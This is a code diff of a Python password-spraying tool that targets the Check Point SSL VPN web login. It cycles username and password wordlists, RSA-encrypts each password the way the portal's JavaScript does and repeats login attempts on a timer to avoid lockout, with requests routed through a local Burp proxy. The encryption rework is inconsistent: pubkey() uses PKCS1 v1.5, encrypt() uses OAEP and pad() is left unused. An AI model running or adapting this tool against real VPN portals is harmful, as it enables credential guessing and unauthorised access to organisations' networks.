@@ -1,9 +1,6 @@
 #!/usr/bin/env python
 # -*-coding:Utf-8- -*
 
-# This script will password spray a checkpoint VPN over a period of time
-# !!! Be carefull of password policy and account lockout restriction !!!
-
 import sys
 import os
 import argparse
@@ -13,19 +10,27 @@ import requests
 from urllib.parse import urlparse
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 from Crypto.PublicKey  import RSA
+from Crypto.Cipher import PKCS1_OAEP
+from Crypto.Hash import SHA
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_v1_5
+from Crypto.Hash import SHA
+from binascii import hexlify
+
+# NOTE we passing the request to burp. If you don't need it, deactivate it at line 112
 
 #Disabling HTTPS certificate verification
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
-#User Args: Username wordlist, password wordlist and Cookies needs to be modified
+#User Args: Username wordlist, password wordlist and Cookies needs to be modified. Check in Burp. 
 Headers={"Content-Type": "application/x-www-form-urlencoded"}
-Cookies={"CheckCookieSupport":"1","_ga":"XXXXXXX","_fbp":"XXXXXXX","_gcl_au":"XXXXXXX","selected_realm":"ssl_vpn","_gid":"XXXXXXX"}
+Cookies={"CheckCookieSupport":"1","selected_realm":"ssl_vpn"}
 usernameList="./user.txt"
 passwordList="./pass.txt"
 
 #User arguments function
 def get_Args():
-    parser = argparse.ArgumentParser(description='Password Spray tool for CheckPoint VPN web interface: python3 checkpointSpray.py -u https://acces.company.com/Login/Login usernames.txt passwords.txt -a 2 -t 30')
+    parser = argparse.ArgumentParser(description='Password Spray tool for CheckPoint VPN web interface: python3 checkpointSpray.py -u https://acces.company.com/Login/Login -a 2 -t 30')
     parser.add_argument('-u','--url', help='CheckPoint Login URL to spray', required=True)
     parser.add_argument('-a','--attempt',help='Number of attempts to be run per user at each timer loop', type=int, required=True)
     parser.add_argument('-t','--time',help='Relaunch spray every X minutes', type=int, required=True)
@@ -50,40 +55,49 @@ def iterbytes (x) :
         yield (x [i:i+1])
 # end def iterbytes
 
-def pubkey(password) :
+def pubkey(password):
     # Exponent (e) and Modulus (m) are stored within the JavaScript file JS_RSA.JS (var modulus / var exponent)
-    e = int(b'XXXXX', 16)
-    m = int('XXXXXXXXXXXXXXXXXXX',16)
-    pubkey  = RSA.construct((m, e))
-    passpass = encrypt(password,pubkey)
-    return passpass
+    e = int('XXXXXXXXXXXX', 16)
+    m = int('XXXXXXXXXXXXXXXXX', 16)
+    pubkey = RSA.construct((m, e))
+    cipher = PKCS1_v1_5.new(pubkey)
+    # Encrypt the password
+    encrypted_data = cipher.encrypt(password.encode('utf-8'))
+    # Convert the encrypted data to a hexadecimal string
+    encrypted_hex = hexlify(encrypted_data).decode()
+    return encrypted_hex
 
-def pad(password, pubkey) :
-    l = (pubkey.size()+7)>>3
+
+def pad(password, pubkey):
+    # Getting the size in bytes directly
+    l = pubkey.size_in_bytes()
     r = []
     r.append(b'\0')
 
-    for x in iterbytes(reversed (password.encode('utf-8'))):
+    for x in iterbytes(reversed(password.encode('utf-8'))):
         r.append(x)
     r.append(b'\0')
     n = l - len(r) - 2
     
-    r.append (os.urandom (n))
-    r.append (b'\x02')
-    r.append (b'\x00')
+    r.append(os.urandom(n))
+    r.append(b'\x02')
+    r.append(b'\x00')
 
-    return b''.join (reversed (r))
+    return b''.join(reversed(r))
     # end def pad
 
-def encrypt(password,pubkey) :
-    x = pad(password,pubkey)
-    e = pubkey.encrypt(x,'')[0]
-    e = ''.join ('%02x' % b_ord(c) for c in reversed(e))
-    return e
+def encrypt(password, pubkey):
+    cipher = PKCS1_OAEP.new(pubkey, hashAlgo=SHA)
+    encrypted_data = cipher.encrypt(password.encode('utf-8'))
+    # Convert encrypted data to hex string
+    encrypted_hex = ''.join('{:02x}'.format(x) for x in encrypted_data)
+    return encrypted_hex
+
 
 
 def spray(url, usernameList, passwordList, attempt, loop):
     counter = 1
+    proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
     passwords = open(passwordList, "r")
     for password in passwords:
         passwd = (password.strip("\n"))
@@ -95,7 +109,7 @@ def spray(url, usernameList, passwordList, attempt, loop):
             username = (user.strip("\n"))
 
             data = {"selectedReal": "ssl_vpn", "loginType": "Standard", "userName": username,"password": encryptedpass}
-            req = requests.post(url, data=data, headers=Headers, cookies=Cookies, verify=False, allow_redirects=False)
+            req = requests.post(url, data=data, headers=Headers, cookies=Cookies, verify=False, allow_redirects=False, proxies=proxies)
             
             print("--- Username : "+username+" : "+passwd)
 
